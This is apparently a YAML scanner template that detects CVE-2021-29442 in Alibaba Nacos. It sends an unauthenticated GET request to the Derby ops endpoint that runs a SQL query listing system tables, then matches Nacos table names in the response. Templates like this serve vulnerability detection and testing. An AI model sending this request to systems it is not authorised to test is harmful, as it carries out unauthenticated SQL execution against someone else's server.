name: poc-yaml-alibaba-nacos-cve-2021-29442-unauth
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
        expression: |
            response.status == 200 && "\"TABLENAME\":\"(?:(?:(?:(?:(?:APP_CONFIGDATA_RELATION_[PS]UB|SYS(?:(?:CONGLOMERAT|ALIAS|(?:FI|RO)L)E|(?:(?:ROUTINE)?|COL)PERM|(?:FOREIGN)?KEY|CONSTRAINT|T(?:ABLEPERM|RIGGER)|S(?:TAT(?:EMENT|ISTIC)|EQUENCE|CHEMA)|DEPEND|CHECK|VIEW|USER)|USER|ROLE)S|CONFIG_(?:TAGS_RELATION|INFO_(?:AGGR|BETA|TAG))|TENANT_CAPACITY|GROUP_CAPACITY|PERMISSIONS|SYSCOLUMNS|SYS(?:DUMMY1|TABLES)|APP_LIST)|CONFIG_INFO)|TENANT_INFO)|HIS_CONFIG_INFO)\"".bmatches(response.body)
expression: r0()
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
    vulnerability:
        id: CT-151539
        level: high
